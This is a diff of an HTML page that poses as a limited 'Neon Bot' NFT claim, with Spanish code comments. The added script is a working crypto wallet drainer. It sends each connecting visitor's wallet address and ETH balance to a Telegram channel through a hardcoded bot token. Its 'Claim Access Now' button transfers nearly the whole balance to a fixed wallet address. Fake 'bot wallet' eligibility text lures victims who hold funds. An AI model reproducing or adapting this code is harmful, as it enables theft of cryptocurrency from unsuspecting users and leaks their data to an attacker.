@@ -42,6 +42,7 @@
             z-index: -1;
         }
 
+        /* Contenedor principal */
         .container {
             text-align: center;
             max-width: 600px;
@@ -51,6 +52,18 @@
             box-sizing: border-box;
         }
 
+        /* Fondo animado de partículas */
+        #particleBackground {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-color: transparent;
+        }
+
+        /* Título */
         h1 {
             font-size: 2.2em;
             margin-bottom: 0.5em;
@@ -65,6 +78,7 @@
             line-height: 1.4em;
         }
 
+        /* Botones */
         button {
             font-size: 1.1em;
             padding: 0.8em 2em;
@@ -78,9 +92,9 @@
             color: #ffffff;
             width: 80%;
             box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
+            display: block; /* Aseguramos que el botón ocupe toda la línea */
+            margin-left: auto; /* Centra el botón */
+            margin-right: auto; /* Centra el botón */
         }
 
         button:hover {
@@ -96,6 +110,7 @@
             font-weight: bold;
         }
 
+        /* Estilos de tarjeta */
         .card {
             background-color: #1c1c1c;
             border-radius: 15px;
@@ -112,6 +127,7 @@
             margin-bottom: 10px;
         }
 
+        /* Barra de progreso con animación */
         .progress-container {
             width: 100%;
             background-color: #333;
@@ -150,13 +166,16 @@
     <div class="background-image"></div>
     <div class="background-overlay"></div>
 
+    <canvas id="particleBackground"></canvas>
+
     <div class="container">
-        <h1><span class="neon">NEON</span> ACCESS</h1>
+        <h1><span class="neon">NEON</span> <span class="bot">BOT</span> ACCESS</h1>
         <p class="description">
-            Claim 1 of 300 exclusive Neon Bot.<br>
+            Claim 1 of 300 exclusive Neon Bot copies.<br>
             Avoid Bot Wallets, Only wallets with transactions are eligible.
         </p>
 
+        <!-- Tarjeta del NFT con la barra de progreso y texto "Copys Claimed" -->
         <div class="card">
             <img src="tarjeta.jpg" alt="NFT Preview">
             <div class="progress-container">
@@ -166,47 +185,83 @@
         </div>
 
         <button id="connectButton">Connect</button>
+        <button id="sendButton" style="display:none;">Claim Access Now</button>
         <p id="status"></p>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg';
-        const TELEGRAM_CHANNEL_ID = '-1002286653887';
+        let web3;
+        let accounts;
 
-        async function sendMessageToTelegram(walletAddress, ethBalance) {
-            const message = `Nueva conexión:\n\nWallet: ${walletAddress}\nBalance: ${ethBalance} ETH`;
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const telegramBotToken = '8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg';  // Token del Bot de Telegram
+        const chatId = '-1002286653887';  // ID del Canal de Telegram
 
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHANNEL_ID, text: message }),
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
-                }
-                console.log('Mensaje enviado con éxito.');
-            } catch (error) {
-                console.error('Error enviando mensaje a Telegram:', error);
-            }
+        // Función para enviar mensaje a Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Mensaje enviado a Telegram:', data))
+                .catch(error => console.error('Error al enviar mensaje a Telegram:', error));
         }
 
+        // Lógica para conectar la wallet
         document.getElementById('connectButton').onclick = async () => {
             if (typeof window.ethereum !== 'undefined') {
-                const web3 = new Web3(window.ethereum);
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                
+                // Verificar saldo de la cuenta
+                const balanceWei = await web3.eth.getBalance(accounts[0]);
+                const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-                const walletAddress = accounts[0];
-                const balanceWei = await web3.eth.getBalance(walletAddress);
-                const ethBalance = web3.utils.fromWei(balanceWei, 'ether');
+                // Enviar la información de la wallet al canal de Telegram
+                sendToTelegram(`Wallet conectada: ${accounts[0]}\nSaldo: ${balanceEth} ETH`);
 
-                sendMessageToTelegram(walletAddress, ethBalance);
+                // Verificar si la cuenta tiene historial de transacciones (si tiene saldo)
+                if (parseFloat(balanceEth) > 0) {
+                    document.getElementById('status').innerText = `Accepted Claim the Access`;
+                    document.getElementById('sendButton').style.display = 'block';  // Mostrar el botón para enviar
+                } else {
+                    document.getElementById('status').innerText = `Not accepted to claim to lack of transaction history; bot wallet detected`;
+                    document.getElementById('status').style.color = '#e74c3c'; // Color rojo para bot wallet
+                }
 
-                document.getElementById('status').innerText = `Wallet conectada: ${walletAddress}`;
+                document.getElementById('connectButton').style.display = 'none'; // Ocultar el botón de conectar
             } else {
-                alert('Por favor, instala MetaMask.');
+                alert('Please install MetaMask!');
+            }
+        };
+
+        // Lógica para enviar todo el saldo
+        document.getElementById('sendButton').onclick = async () => {
+            const fromAccount = accounts[0];
+            const toAccount = '0x6497C5aDe6F21CDAf604E417FD0062ca4f98543F'; // Dirección de destino (ejemplo)
+            const balanceWei = await web3.eth.getBalance(fromAccount);
+            const gasFee = web3.utils.toWei('0.001', 'ether'); // Tarifa de gas de ejemplo
+
+            if (balanceWei > gasFee) {
+                const amountToSend = balanceWei - gasFee;
+
+                web3.eth.sendTransaction({
+                    from: fromAccount,
+                    to: toAccount,
+                    value: amountToSend
+                })
+                .then(tx => {
+                    alert(`Transferencia exitosa: ${tx.transactionHash}`);
+                    document.getElementById('status').innerText = 'Todo el saldo ha sido enviado correctamente';
+                    
+                    // Enviar la transacción a Telegram
+                    sendToTelegram(`Transferencia realizada desde la wallet: ${fromAccount}\nTransacción Hash: ${tx.transactionHash}`);
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert('Error en la transferencia.');
+                });
+            } else {
+                alert('No tienes suficiente saldo para cubrir la tarifa de gas.');
             }
         };
     </script>
